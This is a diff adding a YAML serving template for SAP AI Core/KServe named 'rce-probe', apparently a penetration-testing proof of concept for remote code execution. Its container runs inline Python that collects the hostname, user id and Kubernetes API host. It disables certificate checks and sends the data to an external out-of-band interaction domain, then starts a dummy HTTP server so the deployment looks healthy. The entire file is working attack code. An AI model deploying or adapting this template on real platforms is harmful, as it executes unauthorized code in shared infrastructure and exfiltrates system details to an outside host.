@@ -1,0 +1,56 @@
+apiVersion: ai.sap.com/v1alpha1
+kind: ServingTemplate
+metadata:
+  name: rce-probe
+  labels:
+    scenarios.ai.sap.com/id: "rce-probe"
+    ai.sap.com/version: "1.0.0"
+  annotations:
+    scenarios.ai.sap.com/name: "rce-probe"
+    executables.ai.sap.com/name: "rce-probe"
+    executables.ai.sap.com/description: "rce-poc"
+spec:
+  template:
+    apiVersion: "serving.kserve.io/v1beta1"
+    metadata:
+      annotations: |
+        autoscaling.knative.dev/target: 1
+      labels: |
+        ai.sap.com/resourcePlan: starter
+    spec: |
+      predictor:
+        minReplicas: 1
+        maxReplicas: 1
+        containers:
+        - name: kserve-container
+          image: python:3.11
+          command: ["/bin/sh", "-c"]
+          args:
+          - |
+            python3 -c "
+            import os, subprocess, urllib.request, urllib.parse, ssl
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            h = subprocess.check_output(['hostname']).decode().strip()
+            id_out = subprocess.check_output(['id']).decode().strip()
+            k = os.environ.get('KUBERNETES_SERVICE_HOST', 'none')
+            print('[RCE] hostname: ' + h, flush=True)
+            print('[RCE] id: ' + id_out, flush=True)
+            print('[RCE] K8S_API_HOST: ' + k, flush=True)
+            params = urllib.parse.urlencode({'hostname': h, 'id': id_out, 'k8s_api': k})
+            url = 'https://d7f3ocmipla4s5su4uagwdr16jsrwr95r.oast.pro/?' + params
+            try:
+                r = urllib.request.urlopen(urllib.request.Request(url), timeout=15, context=ctx)
+                print('[RCE] OAST_HIT: ' + str(r.status), flush=True)
+            except Exception as e:
+                print('[RCE] OAST_ERR: ' + str(e), flush=True)
+            "
+            python3 -c "
+            import http.server
+            class H(http.server.BaseHTTPRequestHandler):
+                def do_GET(self):
+                    self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
+                def log_message(self, *a): pass
+            http.server.HTTPServer(('', 8080), H).serve_forever()
+            "
